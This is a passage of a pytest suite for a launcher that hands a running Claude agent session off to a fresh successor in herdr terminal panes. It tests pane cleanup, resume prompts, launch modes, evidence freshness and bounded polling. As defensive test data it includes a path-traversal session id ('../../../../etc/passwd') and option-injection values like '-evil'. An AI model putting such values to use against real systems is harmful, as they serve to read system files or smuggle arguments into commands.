        """AC6: never retype or summarise the goal — read the predecessor's own last unmet row."""
        t = tmp_path / "pred.jsonl"
        t.write_text(TRANSCRIPT_OK, encoding="utf-8")
        proc = _cli("read-goal-condition", "--transcript", str(t))
        assert proc.returncode == 0, proc.stderr
        assert json.loads(proc.stdout)["condition"] == GOAL_CONDITION

    def test_no_unmet_goal_in_the_predecessor_is_an_explicit_refusal(self, tmp_path) -> None:
        t = tmp_path / "pred.jsonl"
        t.write_text('{"type":"user"}\n', encoding="utf-8")
        proc = _cli("read-goal-condition", "--transcript", str(t))
        assert proc.returncode == 3, proc.stdout
        assert "no unmet goal" in proc.stderr.lower()

    def test_the_cli_drives_perform_handoff_with_the_derived_prompt(self, tmp_path,
                                                                    monkeypatch) -> None:
        """In-process so the whole wiring is observable: driver-state -> disposition ->
        resume prompt -> perform_handoff. Without this, `handoff` could parse arguments
        perfectly and still never reach the sequence."""
        seen = {}

        def fake(**kw):
            seen.update(kw)
            return {"ok": True, "results": {}, "steps": [], "new_pane": "w1:pZZ",
                    "session_id": "s", "cleanup": None, "truncated": False,
                    "failed_step": None}

        monkeypatch.setattr(ll, "perform_handoff", fake)
        rc = ll.main(_handoff_argv(_state(tmp_path), tmp_path,
                                   **{"--launcher-armed": None,
                                      "--fresh-launch-supported": None}))
        assert rc == 0, seen
        assert seen["anchor_pane"] == "w1:p1"
        assert seen["goal_condition"] == "keep going"
        assert "612" in seen["resume_prompt"], "the successor must be told which child is next"
        assert seen["launch_mode"] == "fresh"
        assert seen["transcript_dir"] == str(tmp_path)


class TestOwnershipDiscipline:
    """#611 Step-11 High 3 / Medium 5: a tentative successor pane must never be leaked, and a
    failed predecessor teardown must not be reported as a successful handoff."""

    def test_every_post_split_failure_closes_the_tentative_pane(self) -> None:
        for fail_at in ("herdr agent start", "herdr agent wait", "herdr pane send-text",
                        "herdr pane send-keys"):
            r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                       fail_on=fail_at)
            out = ll.perform_handoff(runner=r, **_handoff())
            assert out["ok"] is False, fail_at
            assert "cleanup_tentative_pane" in [s["kind"] for s in out["steps"]], \
                f"{fail_at}: tentative pane leaked"
            closed = [c for c in r.calls if c[:3] == ["herdr", "pane", "close"]]
            assert closed and closed[0][3] == "w1:pZZ", f"{fail_at}: wrong pane closed"
            assert not any(c[3] == "w1:p1" for c in closed), \
                f"{fail_at}: predecessor must never be closed on a failed handoff"

    def test_failed_verification_also_closes_the_tentative_pane(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK,
                    "herdr pane get": json.dumps({"result": {"pane": {}}})})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "spawned"
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]

    def test_happy_path_does_not_close_the_successor(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True
        assert out["cleanup"] is None
        closed = [c for c in r.calls if c[:3] == ["herdr", "pane", "close"]]
        assert [c[3] for c in closed] == ["w1:p1"], "only the predecessor is retired"

    def test_a_failed_predecessor_teardown_is_not_reported_as_success(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on="herdr pane close")
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == "teardown_predecessor"

    def test_bad_arguments_never_create_a_pane(self) -> None:
        """Validation happens before the split, so a refusal cannot leak a pane."""
        for over in ({"name": "-evil"}, {"goal_condition": "  "},
                     {"readiness_timeout_ms": 1000}, {"launch_mode": "--permission-mode"},
                     {"resume_prompt": "   "}):
            r = Runner({"herdr pane split": SPLIT_OK})
            with pytest.raises(ll.LauncherError):
                ll.perform_handoff(runner=r, **_handoff(**over))
            assert r.calls == [], f"{over}: a command ran before validation failed"

    def test_a_runner_exception_after_the_split_still_cleans_up(self) -> None:
        calls = []

        def boom(argv, timeout=180):
            calls.append(argv)
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "pane", "close"]:
                return FakeProc(0)
            raise subprocess.SubprocessError("herdr died")

        out = ll.perform_handoff(runner=boom, **_handoff())
        assert out["ok"] is False
        assert any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:pZZ" for c in calls)


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — the successor must actually be told to RESUME
# ---------------------------------------------------------------------------

class TestResumePrompt:
    """The second revision armed `/goal` and stopped there. A guarded session that is never
    given work just sits at an empty prompt: the goal only re-prompts once the session tries to
    STOP, so the run would stall silently and the predecessor would already be retired."""

    def test_resume_prompt_is_sent_after_the_bind_and_before_the_goal(self) -> None:
        """#694 inverted this test's predecessor, which asserted the prompt came AFTER the goal.
        The bind leads (its own send), the work follows, and the guard is armed last."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert _sent(r) == [f"/rawgentic:switch {PROJECT}", RESUME_PROMPT,
                            f"/goal {GOAL_CONDITION}"]

    def test_resume_prompt_waits_until_the_BIND_is_VERIFIED_landed(self) -> None:
        """Not merely 'sent after' — sent after the successor's own registry row was observed. A
        prompt handed to a session that never bound cannot read anything under projects/, and the
        pane is closed when `project_switched` exhausts."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry="")))            # registry row never appears
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert _sent(r) == [f"/rawgentic:switch {PROJECT}"], \
            "resume prompt sent despite no bind"
        assert not _predecessor_closed(r)

    def test_the_goal_waits_until_the_PROMPT_is_verified_landed(self) -> None:
        """The guard goes last, but not blindly last: with a marker supplied it is armed only once
        the prompt is proven to have arrived, so `goal_armed` can never be the only thing that
        passed."""
        marker = "[rawgentic-midchild:4:7]"
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            resume_prompt=f"{marker} {RESUME_PROMPT}", prompt_marker=marker,
            read_text=Artifacts(transcript="")))
        assert out["ok"] is False and out["failed_step"] == "prompt_landed"
        assert not any(t.startswith("/goal") for t in _sent(r))
        assert not _predecessor_closed(r)

    def test_a_handoff_with_no_resume_prompt_is_refused_before_anything_runs(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError):
            ll.perform_handoff(runner=r, **_handoff(resume_prompt=""))
        assert r.calls == []

    def test_a_prompt_carrying_a_bind_ANYWHERE_is_refused_before_anything_runs(self) -> None:
        """#694 inverted #682's precondition. The bind is SEND 1, so a prompt that also binds makes
        the successor run the switch skill twice. Position does not matter — a mid-prompt bind is
        the same double-bind — which is why the guard looks for the directive rather than checking a
        prefix. Refused BEFORE the split, like every other caller mismatch, so the refusal never
        leaves a pane behind."""
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError, match="carries"):
            ll.perform_handoff(runner=r, **_handoff(
                resume_prompt="Resume epic #667: git fetch origin, then /rawgentic:switch rawgentic."))
        assert r.calls == [], "a pane was created before the caller mismatch was caught"

    def test_a_prompt_with_no_bind_directive_is_exactly_what_is_expected_now(self) -> None:
        """The pre-#694 version of this test asserted such a prompt was REFUSED. It is now the
        canonical shape, because the launcher supplies the bind itself."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            resume_prompt="Resume epic #667 and run the next child."))
        assert out["ok"] is True, out

    def test_resume_prompt_step_is_named_in_the_output(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert "send_resume_prompt" in [s["kind"] for s in out["steps"]]

    def test_a_failed_resume_prompt_aborts_and_keeps_the_predecessor(self) -> None:
        """A send that fails here is the worst case available: the guard is armed but the
        successor has no work. Retiring the predecessor now would strand the whole run."""
        calls = []

        def runner(argv, timeout=180):
            calls.append(argv)
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "pane", "get"]:
                return FakeProc(0, PANE_GET_OK)
            if argv[:4] == ["herdr", "pane", "send-text", "w1:pZZ"] and argv[4] == RESUME_PROMPT:
                return FakeProc(1)
            return FakeProc(0)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "send_resume_prompt"
        assert not any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:p1" for c in calls)


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — typed launch modes, not caller-supplied claude args
# ---------------------------------------------------------------------------

class TestLaunchModes:
    def test_fresh_carries_no_claude_args(self) -> None:
        assert ll.claude_args_for_launch_mode("fresh") == []
        argv = ll.build_agent_start_argv(name="child4", pane="w1:pZZ",
                                         claude_args=ll.claude_args_for_launch_mode("fresh"))
        assert "--" not in argv and "--continue" not in argv

    def test_resume_mode_was_removed_not_merely_discouraged(self) -> None:
        """#611 Step-11 pass-4 High 1. A resumed successor can already own a registry row and an
        unmet goal row, so its evidence is temporal, never causally bound to THIS handoff.
        #569's contract is a FRESH successor with no `--resume`, so the mode was never needed —
        deleting it removes the whole stale-evidence class rather than documenting around it."""
        assert "resume" not in ll.LAUNCH_MODES
        with pytest.raises(ll.LauncherError):
            ll.claude_args_for_launch_mode("resume")

    @pytest.mark.parametrize("bad", ["", None, "FRESH", "--permission-mode", "print", 7,
                                     "resume"])
    def test_an_unknown_launch_mode_is_refused(self, bad) -> None:
        with pytest.raises(ll.LauncherError):
            ll.claude_args_for_launch_mode(bad)

    def test_fresh_mode_never_reloads_the_predecessor_transcript(self) -> None:
        """`fresh_session_available` only advertises fresh mode for a launcher that positively
        supports a NO-`--resume` launch (driver_lib Step-11 F1). A `fresh` handoff that quietly
        passed `--continue` would defeat exactly that."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff(launch_mode="fresh"))
        start = [c for c in r.calls if c[:3] == ["herdr", "agent", "start"]][0]
        assert "--continue" not in start and "--resume" not in start


# ---------------------------------------------------------------------------
# #611 Step-11 Medium 4 — the evidence must be FRESH and launch-bound
# ---------------------------------------------------------------------------

class TestEvidenceIsLaunchBound:
    """`--continue`/`--resume` mean the successor can carry a session id that ALREADY owns a
    registry row and an unmet goal row. Reading the whole file would then authorise teardown on
    the predecessor's own history."""

    def test_a_pre_launch_registry_row_does_not_count(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry_pre=REGISTRY_OK, registry="")))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_a_pre_launch_goal_row_does_not_count(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(transcript_pre=TRANSCRIPT_OK, transcript="")))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert not _predecessor_closed(r)

    def test_history_before_the_launch_does_not_hide_a_real_new_row(self) -> None:
        """The offset must not be so blunt that a busy artifact never passes."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry_pre='{"session_id":"older"}\n',
                                transcript_pre='{"unrelated":1}\n')))
        assert out["ok"] is True, out

    def test_a_goal_row_for_a_DIFFERENT_condition_does_not_count(self) -> None:
        """Launch-binding by content: the armed guard must be the one we sent, not any unmet
        goal that happens to be in the transcript."""
        other = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                           "sentinel": True, "condition": "someone else's run"}})
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=Artifacts(transcript=other)))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"

    def test_a_truncated_condition_is_matched_in_its_TRUNCATED_form(self) -> None:
        """A capped goal arms the truncated text, so that is what the transcript will carry.
        Matching against the original would fail forever and teardown could never fire."""
        long_condition = "y" * 5000
        armed, truncated = ll.armed_condition(long_condition)
        assert truncated is True and len(armed) < len(long_condition)
        row = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                         "condition": armed}})
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            goal_condition=long_condition, read_text=Artifacts(transcript=row)))
        assert out["ok"] is True, out
        assert out["truncated"] is True

    def test_a_missing_artifact_pre_launch_is_offset_zero_not_a_crash(self) -> None:
        """The successor's transcript genuinely does not exist before it is spawned, so the
        offset capture must treat 'unreadable' as 'nothing here yet' — not abort the handoff."""
        arts = Artifacts()
        seen = {"transcript": 0}

        def reader(path):
            if path == REGISTRY_PATH:
                return arts(path)
            seen["transcript"] += 1
            if seen["transcript"] == 1:
                raise FileNotFoundError("no such file")
            return TRANSCRIPT_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is True, out


class TestBaselineIntegrity:
    """#611 Step-11 pass-3 High 1. The previous revision mapped EVERY `OSError` to offset 0, so
    an artifact that exists but is momentarily unreadable was treated as empty — and the whole
    pre-existing file then counted as this launch's evidence."""

    def test_an_unreadable_registry_refuses_the_handoff(self) -> None:
        def reader(path):
            if path == REGISTRY_PATH:
                raise PermissionError("locked")
            return TRANSCRIPT_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "registry_baseline_unreadable"
        assert r.calls == [] or not any(c[:3] == ["herdr", "pane", "split"] for c in r.calls), \
            "no baseline means no launch — nothing should have been created"

    def test_an_unreadable_successor_transcript_refuses_after_the_split(self) -> None:
        arts = Artifacts()

        def reader(path):
            if path == REGISTRY_PATH:
                return arts(path)
            raise PermissionError("locked")

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "transcript_baseline_unreadable"
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]
        assert not _predecessor_closed(r)

    def test_a_missing_file_is_still_offset_zero_not_a_refusal(self) -> None:
        """`FileNotFoundError` is the ONE case where 'unreadable' honestly means 'empty'."""
        assert ll._baseline(_raise(FileNotFoundError("nope")), "/x") == (0, ll._digest(""))
        assert ll._baseline(_raise(PermissionError("locked")), "/x") is None
        assert ll._baseline(_raise(UnicodeDecodeError("utf-8", b"\xf0", 0, 1, "x")), "/x") is None
        assert ll._baseline(lambda _p: "abcd", "/x") == (4, ll._digest("abcd"))

    def test_a_shrunken_artifact_voids_the_baseline(self) -> None:
        """Rotation or truncation makes the offset point somewhere else entirely, so positional
        evidence is meaningless — it must fail, not compare against the wrong region."""
        assert ll._tail("short", (100, ll._digest("x" * 100))) is None
        assert ll._tail("abcdef", (3, ll._digest("abc"))) == "def"

    def test_a_same_length_replacement_voids_the_baseline(self) -> None:
        """#611 Step-11 pass-4 High 1: length alone cannot see a file REPLACED at the same or a
        greater length — and `registry_prune.py` legitimately rewrites the registry wholesale
        via `os.replace`. The prefix digest is what notices."""
        assert ll._tail("XXXdef", (3, ll._digest("abc"))) is None
        assert ll._tail("abcdef", (3, ll._digest("abc"))) == "def"

    def test_a_replaced_registry_does_not_authorize_teardown(self) -> None:
        reads = {"n": 0}
        arts = Artifacts()

        def reader(path):
            if path != REGISTRY_PATH:
                return arts(path)
            reads["n"] += 1
            # baseline is one history; a concurrent prune then replaces the whole file with a
            # LONGER one that happens to carry the successor's id
            return "old-history\n" if reads["n"] == 1 else "pruned-and-rebuilt\n" + REGISTRY_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_a_rotated_registry_does_not_authorize_teardown(self) -> None:
        reads = {"n": 0}

        arts = Artifacts()

        def reader(path):
            if path != REGISTRY_PATH:
                return arts(path)
            reads["n"] += 1
            # a long history at baseline, then the file is rotated to a short new one that
            # happens to contain the successor's id
            return "x" * 500 if reads["n"] == 1 else REGISTRY_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)


class TestUncertainSplitReporting:
    """#611 Step-11 pass-3 Medium 3 and pass-4 High 3. herdr can CREATE a pane and still fail
    to describe it, so the leak must be SURFACED — but it must never be guessed at. Pass 3
    closed the single new pane in the inventory diff; pass 4 showed that is unsound, because
    cardinality is not attribution: if our split created nothing and an unrelated session split
    concurrently, that one new pane is someone else's live session."""

    def _runner(self, split_stdout, split_rc=0, before=("w1:p1",), after=("w1:p1", "w1:pNEW")):
        listings = [json.dumps({"result": {"panes": [{"pane_id": p} for p in before]}}),
                    json.dumps({"result": {"panes": [{"pane_id": p} for p in after]}})]

        def runner(argv, timeout=180):
            runner.calls.append(list(argv))
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, listings.pop(0) if listings else listings_last(listings))
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(split_rc, split_stdout)
            return FakeProc(0)

        def listings_last(_l):
            return json.dumps({"result": {"panes": [{"pane_id": p} for p in after]}})

        runner.calls = []
        return runner

    @pytest.mark.parametrize("stdout,rc,step", [
        ("not json", 0, "split_response_unparseable"),
        ("", 1, "split"),
    ])
    def test_a_pane_that_appeared_is_reported_and_NEVER_closed(self, stdout, rc, step) -> None:
        r = self._runner(stdout, split_rc=rc)
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["failed_step"] == step
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]
        assert "w1:pNEW" in out["cleanup"], "the operator must be told which pane to check"
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls), \
            "ownership is unprovable here — closing ANY pane risks killing a live session"

    def test_a_concurrent_foreign_pane_is_not_closed(self) -> None:
        """The pass-4 finding in its exact shape: our split creates nothing, an unrelated
        session splits between the two inventories, and the diff is exactly one pane. Pass 3
        would have closed it."""
        r = self._runner("not json", after=("w1:p1", "w1:pSOMEONE_ELSE"))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)
        assert out["cleanup"] and "w1:pSOMEONE_ELSE" in out["cleanup"]

    def test_nothing_created_means_nothing_to_report(self) -> None:
        r = self._runner("not json", after=("w1:p1",))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["cleanup"] is None
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)

    def test_no_inventory_refuses_BEFORE_the_split(self) -> None:
        """#611 Step-11 pass-6 High 1. The inventory is the only thing that can later show a
        returned pane id is genuinely NEW, so it is required rather than best-effort: without it
        a well-formed response naming a pre-existing FOREIGN pane would be claimed as ours and
        closed on the next failure. Refusing is also the honest reading — if `pane list` does
        not work, herdr is not healthy enough to be splitting panes in."""
        calls = []

        def runner(argv, timeout=180):
            calls.append(list(argv))
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(1)
            return FakeProc(0, SPLIT_OK)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "pane_inventory_unavailable"
        assert not any(c[:3] == ["herdr", "pane", "split"] for c in calls), \
            "nothing may be created when ownership could never be proven"
        assert out["cleanup"] is None

    def test_a_malformed_inventory_MEMBER_voids_the_whole_inventory(self) -> None:
        """#611 Step-11 pass-7 High 1. Silently dropping an unparseable record yields a SHORT
        inventory that still looks authoritative — and a pane missing from it reads as "new",
        which is precisely the licence to close a foreign pane. A partial inventory is not one."""
        bad = json.dumps({"result": {"panes": [{"pane_id": "w1:p1"}, {"no_id": True}]}})
        assert ll._pane_inventory(lambda _a, timeout=180: FakeProc(0, bad)) is None

        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, bad)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, json.dumps({"result": {"pane_id": "w1:pFOREIGN"}}))
            return FakeProc(1)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "pane_inventory_unavailable"
        assert out["new_pane"] is None

    def test_a_foreign_pane_is_not_claimed_when_the_inventory_is_missing(self) -> None:
        """The exact pass-6 scenario: inventory fails, then the split returns a well-formed
        pre-existing FOREIGN id. Nothing may be closed."""
        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, "malformed")
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, json.dumps({"result": {"pane_id": "w1:pFOREIGN"}}))
            return FakeProc(1)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "pane_inventory_unavailable"
        assert out["new_pane"] is None

    def test_a_split_TIMEOUT_after_creation_still_reports(self) -> None:
        """#611 Step-11 pass-4 Medium 4: the split used to run OUTSIDE the ownership
        try/finally, so a client timeout after herdr had already created the pane skipped
        cleanup entirely."""
        listings = [json.dumps({"result": {"panes": [{"pane_id": "w1:p1"}]}}),
                    json.dumps({"result": {"panes": [{"pane_id": p}
                                                     for p in ("w1:p1", "w1:pNEW")]}})]

        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, listings.pop(0) if listings else listings[-1:] and "")
            if argv[:3] == ["herdr", "pane", "split"]:
                raise subprocess.TimeoutExpired(cmd="herdr", timeout=180)
            return FakeProc(0)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]

    @pytest.mark.parametrize("returned", ["w1:p1", "w1:pEXISTING"])
    def test_a_returned_id_that_is_not_new_is_never_closed(self, returned) -> None:
        """#611 Step-11 pass-5 High 1: a well-formed response is not proof of ownership. If
        herdr returned the anchor, or an id that already existed, closing it would kill a live
        pane — possibly the predecessor itself, the exact outcome report-only exists to avoid."""
        r = self._runner(json.dumps({"result": {"pane_id": returned}}),
                         before=("w1:p1", "w1:pEXISTING"),
                         after=("w1:p1", "w1:pEXISTING"))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "split_response_not_new"
        assert out["new_pane"] is None, "an unprovable id must not be claimed as ours"
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)

    def test_an_invalid_returned_pane_id_still_reports(self) -> None:
        """A pane id that parses but fails validation left `new_pane` unset, so the `finally`
        saw nothing to clean up (pass-4 Medium 4, second half)."""
        r = self._runner(json.dumps({"result": {"pane_id": "-evil"}}))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)


class TestTranscriptPathIsBuiltNotSupplied:
    """#611 Step-11 pass-7 Medium 2. The earlier revision took a `transcript_path_for` CALLBACK
    and probed it with an invented session id — which rejected any callback that validated its
    input, and proved nothing about the real id anyway. Taking the directory and building the
    path internally removes the callback, the sentinel, and the gap between them."""

    def test_a_missing_transcript_dir_is_refused_before_anything_runs(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError):
            ll.perform_handoff(runner=r, **_handoff(transcript_dir="/no/such/dir"))
        assert r.calls == []

    @pytest.mark.parametrize("bad", ["", None, 7])
    def test_a_non_directory_transcript_dir_is_refused(self, bad) -> None:
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError):
            ll.perform_handoff(runner=r, **_handoff(transcript_dir=bad))
        assert r.calls == []

    def test_a_traversing_session_id_cannot_escape_the_directory(self) -> None:
        """herdr supplies the session id and it is interpolated into a path, so an id carrying
        `..` or a separator would read a file outside the transcript directory."""
        evil = json.dumps({"result": {"pane": {
            "agent_session": {"value": "../../../../etc/passwd"}}}})
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": evil})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "session_id_malformed"
        assert not _predecessor_closed(r)
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]

    def test_the_real_session_id_shape_is_accepted(self) -> None:
        assert ll._SESSION_ID_RE.fullmatch("75f231f2-fdf2-40d4-a68d-71bafcfc8608")


class TestBoundedPolling:
    """The second revision read each artifact ONCE, immediately after `send-keys`, giving the
    hooks no time to write. That is a race whose losing side retires nothing and stalls the run."""

    def test_an_artifact_that_appears_late_is_still_found(self) -> None:
        slept: list[float] = []
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(appear_after=3), sleeper=slept.append))
        assert out["ok"] is True, out
        assert slept, "polling must actually wait between reads"

    def test_polling_is_bounded_and_fails_closed(self) -> None:
        slept: list[float] = []
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(transcript=""), sleeper=slept.append))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert len(slept) <= ll.GOAL_POLL_ATTEMPTS, "polling must be bounded"
        assert not _predecessor_closed(r)

    def test_a_partial_multibyte_read_is_retried_not_fatal(self) -> None:
        """`UnicodeDecodeError` is a ValueError, so catching OSError alone let a read that
        landed mid-character escape the poll and kill the handoff (pass-3 Low 5)."""
        state = {"n": 0}
        arts = Artifacts()

        def flaky(path):
            state["n"] += 1
            if state["n"] == 3:
                raise UnicodeDecodeError("utf-8", b"\xf0\x9f", 0, 2, "truncated")
            return arts(path)

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=flaky, sleeper=lambda _s: None))
        assert out["ok"] is True, out

    def test_a_read_error_mid_poll_does_not_abort_the_poll(self) -> None:
        state = {"n": 0}
        arts = Artifacts()

        def flaky(path):
            state["n"] += 1
            if state["n"] == 3:
                raise OSError("transient")
            return arts(path)

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=flaky, sleeper=lambda _s: None))
        assert out["ok"] is True, out


class TestPollingIsBoundedOnWallClockToo:
    """#694 cross-model review, still open when the falsified fix was reverted.

    An attempts cap bounds how many times `check` runs, not how long the poll may take: each
    attempt does I/O and a blocked read has no ceiling of its own. The review's arithmetic was a
    20-attempt poll whose every call could take the runner's 180 s timeout — about an hour of
    wall clock behind a budget that reads as short.
    """

    def test_a_slow_poll_stops_at_the_wall_clock_deadline(self) -> None:
        clock = {"t": 0.0}
        seen = {"n": 0}

        def check():
            seen["n"] += 1
            clock["t"] += 60.0          # every read blocks for a minute
            return False

        assert ll._poll_for(check, attempts=ll.SWITCH_POLL_ATTEMPTS,
                            delay_s=ll.SWITCH_POLL_DELAY_S, sleeper=lambda _s: None,
                            now=lambda: clock["t"]) is False
        assert seen["n"] < ll.SWITCH_POLL_ATTEMPTS, \
            "the poll spent its whole attempt budget — the wall clock never bounded it"
        nominal = ll.SWITCH_POLL_ATTEMPTS * ll.SWITCH_POLL_DELAY_S
        assert clock["t"] <= nominal * ll.POLL_WALL_CLOCK_SLACK + 60.0

    def test_the_first_attempt_always_runs_even_past_the_deadline(self) -> None:
        """A deadline that could refuse before checking once would turn a slow clock into a
        verdict — the artifact may already be on disk."""
        seen = {"n": 0}

        def check():
            seen["n"] += 1
            return True

        assert ll._poll_for(check, attempts=5, delay_s=1.0, sleeper=lambda _s: None,
                            max_wall_s=0.0, now=lambda: 10.0) is True
        assert seen["n"] == 1

    def test_a_poll_that_simply_needs_several_attempts_is_unaffected(self) -> None:
        """The bound must not refuse a healthy artifact that appears late — that is the whole
        reason bounded polling exists (see TestBoundedPolling)."""
        state = {"n": 0}

        def check():
            state["n"] += 1
            return state["n"] == 5

        assert ll._poll_for(check, attempts=ll.GOAL_POLL_ATTEMPTS, delay_s=ll.GOAL_POLL_DELAY_S,
                            sleeper=lambda _s: None, now=lambda: 0.0) is True

    def test_the_pane_ready_retry_is_bounded_on_wall_clock(self) -> None:
        """`agent_start` is where the arithmetic actually bit: 15 attempts against a runner whose
        timeout is 180 s is a 45-minute ceiling on 'a condition that resolves itself in about a
        second'."""
        clock = {"t": 0.0}
        starts = {"n": 0}

        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
